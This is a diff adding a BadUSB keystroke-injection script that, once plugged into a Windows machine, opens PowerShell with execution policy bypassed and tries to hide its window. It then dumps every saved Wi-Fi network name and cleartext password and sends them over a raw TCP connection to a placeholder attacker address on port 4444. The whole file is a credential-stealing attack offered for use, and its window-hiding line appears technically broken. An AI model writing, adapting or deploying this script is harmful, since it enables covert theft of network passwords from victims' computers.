@@ -1,0 +1,15 @@
+REM Astra Live - Focus Lock Version
+DELAY 5000
+GUI r
+DELAY 700
+REM Start VISIBLE to capture the focus
+STRING powershell -NoP -Exec Bypass
+ENTER
+DELAY 1500
+REM Hide window internally
+STRING $h=(Get-Process -Id $PID).MainWindowHandle;[void][Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-Module -ListOnly user32).ExportedFunctions['ShowWindow'],[Action[IntPtr,int]])::Invoke($h,0);
+ENTER
+DELAY 500
+REM The Payload uses the REPLACE_IP placeholder
+STRING $p=netsh wlan show profiles;[array]$r=@();foreach($s in $p|Select-String 'All User Profile'){$n=$s.ToString().Split(':')[1].Trim();$c=netsh wlan show profile name="$n" key=clear;$k=($c|Select-String 'Key Content').ToString().Split(':')[1].Trim();$r+="SSID: $n | Pass: $k"};$d=$r -join "`n";$c=New-Object System.Net.Sockets.TcpClient('REPLACE_IP',4444);$s=$c.GetStream();$w=New-Object System.IO.StreamWriter($s);$w.WriteLine($d);$w.Flush();$c.Close();exit
+ENTER
